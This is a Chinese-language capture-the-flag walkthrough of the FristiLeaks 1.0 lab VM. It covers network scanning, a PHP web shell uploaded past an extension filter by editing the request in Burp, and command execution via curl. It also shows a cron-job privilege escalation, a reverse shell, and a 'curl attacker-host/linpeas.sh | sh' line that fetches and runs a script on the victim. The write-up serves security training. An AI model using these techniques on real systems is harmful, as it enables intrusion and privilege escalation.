1. 掃描網段
    ```command
    $ sudo netdiscover -i eth0
    ```
    ![image](https://hackmd.io/_uploads/r1THU7yOxe.png)
2. 掃描 IP
    ```linux
    $ nmap -sV 192.168.163.136
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 02:34 EDT
    Nmap scan report for 192.168.163.136
    Host is up (0.00033s latency).
    Not shown: 989 filtered tcp ports (no-response), 10 filtered tcp ports (host-prohibited)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
    MAC Address: 08:00:27:A5:A6:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.41 seconds
    ```
3. 目錄遍歷
    ```linux
    $ dirb http://192.168.163.136 
    ```
    ![image](https://hackmd.io/_uploads/S1lWsXy_ex.png)
造訪 `robots.txt`
![image](https://hackmd.io/_uploads/HJZmom1dll.png)
但這三個路徑都 `301` ，而在後面加 `/` 的話會到另一個頁面提示說走錯地方
![image](https://hackmd.io/_uploads/BkkTimkuxl.png)
造訪 `http://192.168.163.136/images/` 看到目錄列表
![image](https://hackmd.io/_uploads/ry4uTQJulg.png)
4. 使用 nikto 對網站進行更全面的漏洞掃描
    ```linux
    $ nikto -h http://192.168.163.136
    ```
    ![image](https://hackmd.io/_uploads/HyhTTQJOgg.png)
5. 真的是新年快樂ㄟ，這個目錄名稱也太通靈
    ```
    http://192.168.163.136/fristi/
    ```
    ![image](https://hackmd.io/_uploads/ByyEhVJ_ll.png)
在網頁原始碼中找到一串 `base64` 編碼
![image](https://hackmd.io/_uploads/rJkWoVg_xg.png)
從編碼開頭的 `iVBORw0KGgo...` 可以判斷，這串編碼代表的是一個 PNG 格式的圖片，因此丟到 [base64 to image](https://base64.guru/converter/decode/image) 解碼得出一張圖片
![image](https://hackmd.io/_uploads/rkxqsNgOlg.png)
在原始碼中還看到作者暗藏的提示
![image](https://hackmd.io/_uploads/HJI1GHxuxg.png)
於是嘗試看看使用 `eezeepz/keKkeKKeKKeKkEkkEk` 這組帳密登入
![image](https://hackmd.io/_uploads/H1g2ZBeuxx.png)
6. 進入上傳圖片的頁面後先上傳看看普通圖片
![image](https://hackmd.io/_uploads/SynM1dedeg.png)
前往`/uploads`
![image](https://hackmd.io/_uploads/BkC91OgOlx.png)
再試試把檔案名也貼上
![image](https://hackmd.io/_uploads/BJy6yuldge.png)
現在確定了流程後就來塞塞看 `shell`，為了繞過附檔名審查就把 `php` 改成 `gif`。
看來是上傳成功了，但因為瀏覽器把它當作圖片去解讀，就顯示錯誤
![image](https://hackmd.io/_uploads/Hy7agdg_ex.png)
那就來**用 Burp 修改 request 試試看**，先攔截上傳正常圖片的請求
![image](https://hackmd.io/_uploads/S1FIMuedxl.png)
只修改 `filename` 並且往內容的部分塞 `php shell`
![image](https://hackmd.io/_uploads/HJOyXdxOlx.png)
輸入指令測試看看
![image](https://hackmd.io/_uploads/HkBNXux_xx.png)
Bingo!!!
7. 開始找尋 `flag`
先用 `find` 搜尋看看 `home` 目錄底下有什麼文字檔
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=find%20/home%20-name%20*.txt"
    ▒/home/eezeepz/notes.txt
    ```
    印出來後發現一些線索
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/home/eezeepz/notes.txt"
    ▒Yo EZ,

    I made it possible for you to do some automated checks, 
    but I did only allow you access to /usr/bin/* system binaries. I did
    however copy a few extra often needed commands to my 
    homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
    from /home/admin/

    Don't forget to specify the full path for each binary!

    Just put a file called "runthis" in /tmp/, each line one command. The 
    output goes to the file "cronresult" in /tmp/. It should 
    run every minute with my account privileges.

    - Jerry
    ```
* 其中提示到有一個以 `Jerry` 權限執行的 `cron job` (常駐程式)，每分鐘執行一次
* `Cron job` 會檢查 `/tmp/runthis`，並把每行指令當作命令執行
* 指令的輸出會寫到 `/tmp/cronresult`
* 限制使用的指令只允許使用：系統內建指令 `/usr/bin/*`，以及 `Jerry` 自行複製到 `/home/admin/` 的指令（包括 `chmod`, `df`, `cat`, `echo`, `ps`, `grep`, `egrep`）
8. 得到提示之後開始提權
    使 `cron` 執行目錄權限變更，進而列舉 /home/admin 裡的資訊
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/tmp/runthis"
    ▒/home/admin/chmod -R 777 /home/admin
    ```
    * 原本` /home/admin` 目錄的權限是嚴格限制的（通常只有 `admin` 或 `root` 可讀）
    * 這條指令用 `chmod -R 777` 把整個 `/home/admin` 目錄以及裡面所有檔案和子目錄的權限都改成「所有人都可讀寫執行」。可以發現7=1+2+4，所以7就是可讀、可寫、可執行
    * 因為是透過 `cron` 作業以 `admin` 的身份執行這條命令，`Linux` 系統允許該命令改變檔案權限
    * 修改完權限後，即使用的是 apache 帳號（權限低），也能讀取 `/home/admin` 裡原本被限制的檔案
    * 簡單來說，`cron` 用 `admin` 權限跑了這條命令，間接放開了檔案的訪問限制
    
    接著就等一分鐘後查看 `cronresult` 是否成功將提權指令寫入，並且有在每分鐘執行一次
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/tmp/cronresult"
    executing: /home/admin/chmod -R 777 /home/admin
    ```
    查看 `admin` 目錄
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=ls%20-la%20/home/admin"
    ▒total 652
    drwxrwxrwx. 2 admin     admin       4096 Nov 19  2015 .
    drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
    -rwxrwxrwx. 1 admin     admin         18 Sep 22  2015 .bash_logout
    -rwxrwxrwx. 1 admin     admin        176 Sep 22  2015 .bash_profile
    -rwxrwxrwx. 1 admin     admin        124 Sep 22  2015 .bashrc
    -rwxrwxrwx  1 admin     admin      45224 Nov 18  2015 cat
    -rwxrwxrwx  1 admin     admin      48712 Nov 18  2015 chmod
    -rwxrwxrwx  1 admin     admin        737 Nov 18  2015 cronjob.py
    -rwxrwxrwx  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
    -rwxrwxrwx  1 admin     admin        258 Nov 18  2015 cryptpass.py
    -rwxrwxrwx  1 admin     admin      90544 Nov 18  2015 df
    -rwxrwxrwx  1 admin     admin      24136 Nov 18  2015 echo
    -rwxrwxrwx  1 admin     admin     163600 Nov 18  2015 egrep
    -rwxrwxrwx  1 admin     admin     163600 Nov 18  2015 grep
    -rwxrwxrwx  1 admin     admin      85304 Nov 18  2015 ps
    -rw-r--r--  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
    ```
    看起來兩個文字檔都是要透過 `python` 檔案解密
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/home/admin/whoisyourgodnow.txt"
    ▒=RFn0AKnlMHMPIzpyuTI0ITG
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/home/admin/cryptedpass.txt"    
    ▒mVGZ3O3omkJLmy2pcuTq
    ```    
    但這 `python` 檔案是 `python2` 的語法
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/home/admin/cryptpass.py"
    ▒#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
    import base64,codecs,sys

    def encodeString(str):
        base64string= base64.b64encode(str)
        return codecs.encode(base64string[::-1], 'rot13')

    cryptoResult=encodeString(sys.argv[1])
    print cryptoResult
    ```
    讓 AI 幫忙寫個 `python3` 可以執行的版本
    ```python
    import base64, codecs, binascii


    def decodeString(s: str) -> str:
        # 解碼流程: ROT13 -> 反轉 -> Base64 解碼 (自動補 '=' padding)
        # s: 加密字串
        
        try:
            rot13_decoded = codecs.decode(s, 'rot13')        # ROT13
            reversed_str = rot13_decoded[::-1]               # 反轉
            padded = reversed_str + ('=' * (-len(reversed_str) % 4))  # 補齊 Base64 padding
            return base64.b64decode(padded).decode('utf-8')  # Base64 解碼
        
        except (binascii.Error, UnicodeDecodeError, ValueError) as e:
            return f"解碼失敗: {e}"
        
    # 加密內容
    enc1 = "mVGZ3O3omkJLmy2pcuTq"
    enc2 = "=RFn0AKnlMHMPIzpyuTI0ITG"

    if __name__ == "__main__":
        print(decodeString(enc1))  
        print(decodeString(enc2))
    ```
    解密後得到 `thisisalsopw123` 和 `LetThereBeFristi!` 這兩組密碼
9. 腦袋突然開竅想到其實可以用 `burp` 塞[反向 shell ](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
![image](https://hackmd.io/_uploads/ryQQxf7uex.png)
終於可以好好下指令了
![image](https://hackmd.io/_uploads/SkWElzQulg.png)
目前的 Shell 是一個非互動式的簡易 Shell，功能有限，需要先把它升級成一個功能完整的 TTY Shell
    ```
    $ su admin
    standard in must be a tty
    
    $ python -c 'import pty; pty.spawn("/bin/bash")'
    ```
10. 切換帳號到 `admin` 跟 `fristigod`，密碼都正確，不過這兩個帳號都沒有可利用的資訊了
    ![image](https://hackmd.io/_uploads/SJoiZGQdxx.png)
    ![image](https://hackmd.io/_uploads/Hy7nBzXuel.png)

11.  用 `linpeas` 掃描看有沒有可利用的漏洞
        ```shel
        $ python -m http.server # Host
        $ curl 192.168.163.137:8000/linpeas.sh | sh # Victim
        ``` 
        發現了一個有 `SUID` 權限的二進制文件
![image](https://hackmd.io/_uploads/HJCRVXX_gg.png)

12. 檢查有什麼權限
    ```
    $ sudo -l
    [sudo] password for fristigod: LetThereBeFristi!

    Matching Defaults entries for fristigod on this host:
        requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
        DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
        PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
        LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
        LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
        LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
        secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

    User fristigod may run the following commands on this host:
        (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
    ```
    * 意味著這台靶機設定了 `sudo` 規則，允許以 `fristigod` 身份執行 `/var/fristigod/.secret_admin_stuff/doCom` 程式
    * `doCom` 這個程式本身是一個特權程式（例如 `SUID root` 或具高權限），它允許以 `fristi` 用戶的身份執行指令
    * 執行 `doCom bash` 等同於開啟一個 `bash shell`，該 `shell` 是以 `fristi` 身份運行，比 `fristigod` 權限更高
    * 這就是典型的 `sudo` 權限錯誤配置（misconfiguration），允許低權限用戶透過可控命令執行高權限任務
13. 提權
    ```
    $ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash
    ```
    ![image](https://hackmd.io/_uploads/SJCStfX_gg.png)

    拿到 Flag!!!
    ```
    # cat fristileaks_secrets.txt
    cat fristileaks_secrets.txt
    Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

    I wonder if you beat it in the maximum 4 hours it's supposed to take!

    Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


    Flag: Y0u_kn0w_y0u_l0ve_fr1st1
    ```
    